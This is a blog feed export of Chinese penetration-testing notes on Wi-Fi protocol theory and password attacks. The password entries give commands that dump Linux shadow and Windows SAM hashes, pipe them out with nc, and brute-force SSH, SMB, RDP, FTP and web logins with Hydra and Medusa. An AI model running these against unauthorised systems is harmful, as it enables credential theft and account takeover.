        <content type="html"><![CDATA[<h4 id="连接到无线网络"><a href="#连接到无线网络" class="headerlink" title="连接到无线网络"></a><strong>连接到无线网络</strong></h4><h5 id="Probe"><a href="#Probe" class="headerlink" title="Probe"></a>Probe</h5><p>STA向所有信道发出probe帧,发现AP<br>AP响应信道Response</p><h5 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h5><p>STA向AP发出验证请求<br>发生认证过程(步骤可变)<br>AP相应STA的认证结果</p><h5 id="Association"><a href="#Association" class="headerlink" title="Association"></a>Association</h5><p>STA发出关联请求<br>AP响应关联请求<br>关联成功,开始通信</p><h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a><strong>WEP探测过程</strong></h4><p>Beacon标识使用WEP加密<br>STA发送普通Probe帧<br>AP响应Probe Response帧声明其采用WEP加密</p><h4 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a><strong>WPA探测过程</strong></h4><p>两个AP的Beacon包内容不同,但都声明采用了WPA加密<br>不同厂商对802.11标准的实现方式不同<br>包头包含WPA1字段信息</p><h4 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a><strong>WEP OPEN认证过程</strong></h4><ul><li>WEP OPEN认证与open认证通信过程相同</li><li>正确认证后通信数据被WEP加密</li><li>如果认证时客户端输入错误密码<ul><li>认证依然可以通过</li><li>AP将丢弃该STA的数据包<ul><li>起始向量被错误地密钥解密后完整性被破坏</li><li>但数据传输被失败</li></ul></li><li>认证响应正确,身份验证成功</li></ul></li></ul><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a><strong>WEP PSK认证过程</strong></h4><p>STA发认证请求<br>AP返回随机Challenge消息<br>STA便用PSK加密Cha并发回给AP<br>AP使用PSK解密密文,获得Cha并与原始Cha比对,相同则验证成功,不同则验证失败;<br>大部分无线驱动首先尝试open验证,如果失败则尝试PSK</p><h4 id="WEP共享密钥认证过程"><a href="#WEP共享密钥认证过程" class="headerlink" title="WEP共享密钥认证过程"></a>WEP共享密钥认证过程</h4><ul><li>无论使用什么加密架构,关联过程完全相同<ul><li>STA向AP发送关联请求</li><li>AP向STA发送关联成功或失败结果</li></ul></li><li>隐藏AP<ul><li>STA关联包中必须包含目标的ESSID</li><li>嗅探到此关联包,说明有隐藏AP存在</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线通信 </tag>
            
            <tag> Probe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>John离线密码破解及Ophcrack彩虹表密码破解</title>
      <link href="/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="John-离线密码破解"><a href="#John-离线密码破解" class="headerlink" title="John 离线密码破解"></a><strong>John</strong> 离线密码破解</h3></blockquote><ul><li>支持众多服务应用的加密破解<br>   <code>john --list=formats</code></li><li>支持某些对称加密算法破解<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a><strong>模式</strong></h4></li><li>Wordlist：基于规则的字典破解 </li><li>Single crack:默认被首先执行，使用Login/GECOS信息尝试破解<br>  修改GECOS: <code>chfn -f usernamefull -r room_301 -w 12345 -h 12345 -o penetration cat</code></li><li>Incremental:增量,所有或指定字符集的暴力破解</li><li>External：需要在主配配文件中用C语言子集编程<h5 id="默认破解模式"><a href="#默认破解模式" class="headerlink" title="默认破解模式"></a><strong>默认破解模式</strong></h5></li><li>Single、wordlist、incremental</li><li>主配置文件中指定默认wordlist</li></ul><h4 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a><strong>破解Linux系统账号密码</strong></h4><pre><code>unshadow /etc/passwd /etc/shadow &gt; pass.txt        #合并系统账号及密码并输出到文件john pass.txt     #执行破解john --show pass         #查看破解结果</code></pre><h4 id="破解windows密码"><a href="#破解windows密码" class="headerlink" title="破解windows密码"></a><strong>破解windows密码</strong></h4><pre><code>john sam.dump --wordlist=password.lst --format=ntjohn sam.dump --format=nt --show    #查看破解结果</code></pre><h4 id="Johnny-图形化界面的john"><a href="#Johnny-图形化界面的john" class="headerlink" title="Johnny 图形化界面的john"></a><strong>Johnny 图形化界面的john</strong></h4><pre><code>johnny</code></pre><p>example:<br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/johnny.png" alt="johnny"></p><blockquote><h3 id="Ophcrack-离线密码破解"><a href="#Ophcrack-离线密码破解" class="headerlink" title="Ophcrack 离线密码破解"></a><strong>Ophcrack</strong> 离线密码破解</h3></blockquote><ul><li>基于彩虹表的LM、NTLM密码破解软件</li><li>彩虹表: <code>http://ophcrack.sourceforge.net/tables.php</code><br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/Ophcrack.png" alt="Ophcrack"><br>在线密码破解</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux密码破解 </tag>
            
            <tag> 离线密码破解 </tag>
            
            <tag> 彩虹表 </tag>
            
            <tag> John </tag>
            
            <tag> Ophcrack </tag>
            
            <tag> Windows密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线技术概念</title>
      <link href="/2015/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/"/>
      <url>/2015/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a><strong>无线技术概念</strong></h3></blockquote><h4 id="分贝dB"><a href="#分贝dB" class="headerlink" title="分贝dB"></a><strong>分贝dB</strong></h4><p>测量无线信号强度<br>B:向Alexander Graham Bell 致敬<br>    今天大部分声学设备的发明者和理论奠基人<br>dB:表示2个信号之间的差异比率,用于描述设备的信号强度<br>    是一个相对值<br>dBm:功率值与1mW进行比较的dB值结果<br>dBpower=10.log(singnal/reference)<br>10.log(100mW/1mW)=10*2=20dBm<br>每增加3dBm,功率增加约1倍<br>每增加10dBm,功率增加约10倍<br>Example:<br>    dBm        mW<br>    0        1<br>    10        10<br>    15        32<br>    17        50<br>    20        100<br>    23        200<br>    27        512<br>    30        1000</p><h4 id="dBi-全向天线辐射强度"><a href="#dBi-全向天线辐射强度" class="headerlink" title="dBi:全向天线辐射强度"></a><strong>dBi:全向天线辐射强度</strong></h4><p>全向天线的信号功率增益<br>增益是指信号功率强度增加了多少dB<br>300mW=24.8dBi的无线路由器,添加一个9dBi的天线后功率如何变化(假设2dBi的电缆和接头耗损)<br>24.8dBi+9dBi-2dBi=31.8dBi<br>换算回mW功率<br>10(31.8dBi/10)次方=10*3.18次方=1513mW<br>dBm功率相加等于mW功率相乘</p><h4 id="dBd-定向天线辐射强度"><a href="#dBd-定向天线辐射强度" class="headerlink" title="dBd:定向天线辐射强度"></a><strong><code>dBd</code>:定向天线辐射强度</strong></h4><p>dBd是定向天线的增益值<br>全向天线在所有方向上收发信号,定向天线在指定方向的范围内收发信号<br>天线增益越大信号传输距离越远</p><p>既然有mW来表示功率为什么还要引入dB这个单位?<br>接收信号时无线信号转变为高频电子脉冲,反之发射信号时高频电子脉冲转换为无线电波,<br>这些过程功率往往要产生上万倍的变化,使用W,mW来计数非常不便,而dBm单位通过对功率的对数计算,<br>使用一个较小的数值既可以比较直观的表达功率的变化,因此无线和声学系统都采用了dB这个单位.</p><p>全向天线波形图<br>甜甜圈<br>天线选择的误区<br>益越高越好<br>高功耗<br>对周围环境的信号干扰<br>增益过高的全向天线会变成定向天线</p><h4 id="5dBi-vs-9dBi全向天线波形图对比"><a href="#5dBi-vs-9dBi全向天线波形图对比" class="headerlink" title="5dBi vs 9dBi全向天线波形图对比"></a><strong>5dBi vs 9dBi全向天线波形图对比</strong></h4><p>定向天线<br>双四边形<br>定向发送信号<br>功率相同时,比全向天线传输距离更远(方向正确的情况下)<br>定向天线<br>八木天线,引向反射天线；<br>定向天线<br>平面天线<br>定向天线<br>扇形天线<br>常用于移动电话网络<br>3到4个扇形天线联合使用可实现全向信号覆盖<br>90度扇形天线<br>定向天线<br>120度扇形天线波形<br>定向天线<br>网状天线<br>射束带宽更加集中,功率更强</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 全向天线 </tag>
            
            <tag> 无线技术 </tag>
            
            <tag> 定向天线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash识别及Hashcat离线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3></blockquote><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输(HASH算法加密容易、解密困难)</li><li>服务器端用户数据库应加盐加密保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<br>  长度、字符集</li><li>利用离线破解工具碰撞密码HASH</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><blockquote><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4></blockquote><ul><li><code>hash‐identifier</code></li><li><code>Hashid</code></li><li>可能识别错误或无法识别</li></ul><blockquote><h4 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h4></blockquote><ul><li>利用漏洞：<code>Pwdump</code>,<code>fgdump</code>,<code>mimikatz</code>,<code>wce</code> </li><li>物理接触：<code>samdump2</code></li><li>Kali ISO 启动虚拟机 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdesk -l</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</span><br><span class="line">cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</span><br><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure></li><li>利用nc传输HASH<pre><code>nc -nvlp 333nc 192.168.190.128 333</code></pre><h4 id="Windows系统syskey加密工具"><a href="#Windows系统syskey加密工具" class="headerlink" title="Windows系统syskey加密工具"></a><strong>Windows系统syskey加密工具</strong></h4></li><li>cmd:<code>syskey</code></li><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li></ul><p><strong>Bkhive</strong></p><ul><li><p>从SYSTEM文件中提取bootkey </p></li><li><p>Kali 2.0 抛弃了bkhive </p><p>  apt-get purge samdump2    #卸载samdump2<br>  编译安装:<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code><br>  make<br>  make install<br>  bkhive SYSTEM key<br>  samdump2 SAM key  (版本已更新，不再支持此功能)<br>  建议使用 Kali 1.x</p></li></ul><blockquote><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><strong>Hashcat</strong></h4></blockquote><p>开源多线程密码破解工具<br>支持80多种加密算法破解<br>基于CPU的计算能力破解<br>六种模式 </p><ol start="0"><li>Straight：字典破解</li><li>Combination：将字典中密码进行组合(1 2 &gt; 11 22 12 21)</li><li>Toggle case：尝试字典中所有密码的大小写字母组合</li><li>Brute force：指定字符集(或全部字符集)所有组合</li><li>Permutation：字典中密码的全部字符置换组合(12 21)</li><li>Table-lookup：程序为字典中所有密码自动生成掩码</li></ol><p><strong>命令</strong></p><pre><code>hashcat -bhashcat -m 100 hash.dump pass.lsthashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d结果：hashcat.pothashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> mimikatz </tag>
            
            <tag> nc </tag>
            
            <tag> hashid </tag>
            
            <tag> hash‐identifier </tag>
            
            <tag> hashcat </tag>
            
            <tag> 离线密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oclhashcat基于GPU密码破解及彩虹表破解</title>
      <link href="/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="oclhashcat-离线密码破解"><a href="#oclhashcat-离线密码破解" class="headerlink" title="oclhashcat  离线密码破解"></a><strong>oclhashcat</strong>  离线密码破解</h3><p>号称世界上最快、唯一的基于GPGPU的密码破解软件<br>免费开源、支持多平台、支持分布式、150+hash算法 </p></blockquote><p><strong>硬件支持</strong></p><ul><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动 </li></ul><p><strong>限制</strong></p><ul><li>最大密码长度 55 字符</li><li>使用Unicode的最大密码长度 27 字符</li></ul><p><strong>关于版本</strong><br>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a><strong>命令</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line">?l &#x3D; abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d &#x3D; 0123456789</span><br><span class="line">?s &#x3D;  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line">?a &#x3D; ?l?u?d?s</span><br><span class="line">?b &#x3D; 0x00 - 0xff</span><br></pre></td></tr></table></figure><blockquote><h3 id="RainbowCrack-彩虹表离线密码破解"><a href="#RainbowCrack-彩虹表离线密码破解" class="headerlink" title="RainbowCrack 彩虹表离线密码破解"></a><strong>RainbowCrack</strong> 彩虹表离线密码破解</h3></blockquote><p>基于时间记忆权衡技术生成彩虹表<br>提前计算密码的HASH值,通过比对HASH值破解密码<br>计算HASH的速度很慢,修改版支持CUDA GPU<br>    <code>https://www.freerainbowtables.com/en/download/</code></p><h4 id="KALI-中包含的RainbowCrack工具"><a href="#KALI-中包含的RainbowCrack工具" class="headerlink" title="KALI 中包含的RainbowCrack工具"></a><strong>KALI 中包含的RainbowCrack工具</strong></h4><ul><li>rtgen：预计算，生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成的彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码 </li><li>以上命令必须顺序使用</li></ul><h4 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a><strong>彩虹表</strong></h4><ul><li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li></ul><h5 id="rtgen"><a href="#rtgen" class="headerlink" title="rtgen"></a><code>rtgen</code></h5><p>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160<br><code>rtgen md5 loweralpha 1 5 0 10000 10000 0</code><br>计算彩虹表时间可能很长 </p><p><strong>下载彩虹表</strong><br><code>http://www.freerainbowtables.com/en/tables/</code><br><code>http://rainbowtables.shmoo.com/</code></p><h5 id="彩虹表排序"><a href="#彩虹表排序" class="headerlink" title="彩虹表排序"></a><strong>彩虹表排序</strong></h5><pre><code>/usr/share/rainbowcrackrtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></pre><h5 id="彩虹表密码破解"><a href="#彩虹表密码破解" class="headerlink" title="彩虹表密码破解"></a><strong>彩虹表密码破解</strong></h5><pre><code>rcrack *.rt-h 5d41402abc4b2a76b9719d911017c592rcrack *.rt-l hash.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hashcat </tag>
            
            <tag> 彩虹表 </tag>
            
            <tag> GPU </tag>
            
            <tag> RainbowCrack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medusa在线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Hydra 的缺点</p></blockquote><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>大量目标破解时性能差</li></ul><blockquote><p>Medusa 的特点</p></blockquote><ul><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra(不支持RDP)</li><li>WEB-Form支持存在缺陷</li></ul><h4 id="medusa支持破解的模块"><a href="#medusa支持破解的模块" class="headerlink" title="medusa支持破解的模块"></a><strong>medusa支持破解的模块</strong></h4><pre><code>medusa -d </code></pre><h4 id="medusa破解windows密码"><a href="#medusa破解windows密码" class="headerlink" title="medusa破解windows密码"></a><strong>medusa破解windows密码</strong></h4><pre><code>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></pre><h4 id="medusa破解Linux-SSH密码"><a href="#medusa破解Linux-SSH密码" class="headerlink" title="medusa破解Linux SSH密码"></a><strong>medusa破解Linux SSH密码</strong></h4><pre><code>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>medusa -M ftp -h 1.1.1.1 -e ns -F -u ftp -P password.lstmedusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -Fmedusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-n：非默认端口-s：使用SSL连接-T：并发主机数 medusa -M ftp -q</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 在线密码破解 </tag>
            
            <tag> medusa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>802_11无线协议结构</title>
      <link href="/2015/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2015/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>无线技术变化快,难度大<br>行业迅猛发展<br>互联网的重要入口<br>边界模糊<br>安全实施缺失而且困难<br>对技术不了解而造成配置不当<br>企业网络私自接入AP破坏网络边界<br>aircrack-ng suite作者写过一本关于无线渗透的书</p><h4 id="协议结构"><a href="#协议结构" class="headerlink" title="协议结构"></a><strong>协议结构</strong></h4><ul><li>802.11标准    </li><li>IEEE(Institute of Electrical and Electronice Engineers)<ul><li>由通信航天生物电气电子等方面的科学家组成,目的是制定标准,指导行业技术的发展,目前成员近40万人</li></ul></li><li>IEEE分为不同的技术委员会(Committees),其中802委员会负责lan,man标准的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥</li><li>无线(802.11)<ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层<ul><li>逻辑链路控制子层LLC</li><li>媒体访问控制子层MAC</li></ul></li><li>物理层</li></ul></li></ul></li></ul><h4 id="IEEE-802-1-1-标准"><a href="#IEEE-802-1-1-标准" class="headerlink" title="IEEE 802.1 1 标准"></a><strong>IEEE 802.1 1 标准</strong></h4><p>802委员会下第11组负责开发无线局域网标准<br>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1c Bridge Operation Procedures<br>IEEE 802.1 1d International (Country to Country) Roaming Extensions<br>IEEE 802.1 1e Quality of Service (QoS),Including Packet Bursting<br>IEEE 802.1 1F Inter-Access Point Protocol<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1h Spectrum Managed 802.11a(5 GHz) for European Compatibility<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1j Extensions for Japan<br>IEEE 802.1 1k Radio Resource Measurement Enhancements<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas<br>IEEE 802.1 1p Wireless Access for the Vehicular Environment (WAVE)<br>IEEE 802.1 1r Fast BSS Transition (FT)<br>IEEE 802.1 1s Mesh Networking,Extended Service Set (ESS)<br>IEEE 802.1 1T Wireless Performance Prediction(WPP)<br>IEEE 802.1 1u Internetworking with Non -802 Networks (i.e.:Cellular)<br>IEEE 802.1 1v Wireless Network Management<br>IEEE 802.1 1w Protected Management Frames<br>IEEE 802.1 1y 3650-2700 MHz Operation in the US<br>IEEE 802.1 1z Direct Link Setup (DLS) Extensions<br>IEEE 802.1 1mb Maintenance of the Standard<br>IEEE 802.1 1aa Robust Streaming of Audio Video Transport Streams<br>IEEE 802.1 1ac Very High Throughput &lt; 6 GHz<br>IEEE 802.1 1ad Very High Throughput, 60 GHz<br>IEEE 802.1 1ae QoS Management<br>IEEE 802.1 1af TV Whitespace<br>IEEE 802.1 1ah Sub 1 GHz<br>IEEE 802.1 1ai Fast Initial Link Setup</p><blockquote><p>日常使用</p></blockquote><p>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas</p><h4 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h4><ul><li>发布于1997年</li><li>速率1Mbps或2Mbps</li><li>红外线传输介质(未实现)</li><li>无线射频信号编码(调制)(radio frequencies)<ul><li>Direct-Sequence Spread-Spectrum(DSSS)–十序扩频</li><li>Frequency Hopping Spread-Spectrum(FHSS)–跳频扩频</li></ul></li><li>媒体访问方式—-CSMA/CA c=b+log2(1+s/n)<ul><li>根据算法侦听一定时长</li><li>发送数据前发包声明</li></ul></li><li>Request to Send/Clear to Send(RTS/CTS)</li></ul><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a><strong>802.11b</strong></h4><ul><li>Complermentary Code Keying(CCK)–补充代码键<ul><li>5.5 and 1 1Mbit/s</li><li>2.4GHz band (2.4GHz-2.485GHz)</li><li>14个重叠的信道channets</li><li>每个信道22MHz带宽</li><li>只有三个完全不重叠的信道<br>美国–1 to 11(2.412 GHz–2.462 GHz)<br>欧洲–1 to 13(2.412 GHz–2.472 GHz)<br>日本–1 to 14(2.412 GHz–2.485 GHz)</li></ul></li></ul><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a><strong>802.11a</strong></h4><ul><li>与802.1 1b几乎同时发布<ul><li>因设备价格问题一直没有得到广泛使用</li></ul></li><li>使用5GHz带宽<ul><li>2.4GHz带宽干扰源多(微波,蓝牙,无线电话)</li><li>5GHz频率有更多带宽空间,可容纳更多不重叠的信道</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<ul><li>正交频分复用技术</li></ul></li><li>更高速率54Mbps,每个信道20MHz带宽</li><li>变频<ul><li>5.15-5.35 GHz室内</li><li>5.7-5.8 GHz室外</li></ul></li></ul></li></ul><h4 id="802-1-1g"><a href="#802-1-1g" class="headerlink" title="802.1 1g"></a><strong>802.1 1g</strong></h4><p>2.4GHz 频段<br>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<br>与802.11a速率相同<br>可全局降速 向后兼容802.11b,并切换为CCK信号调制方法<br>每个信道20/22MHz带宽</p><h4 id="802-1-1n"><a href="#802-1-1n" class="headerlink" title="802.1 1n"></a><strong>802.1 1n</strong></h4><p>2.4或5GHz频率<br>300Mbps最高600Mbps<br>Multiple-Input Multiple-Output (MIMO)多进多出通信技术    #多个天线<br>多天线,多无线电波,独立收发信号<br>可以使用40MHz信道带宽是数据传输速率翻倍<br>全802.11n设备网络中,可以使用新报文格式,使速率达到最大<br>每个信道20/40MHz带宽</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hydra在线密码破解</title>
      <link href="/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" 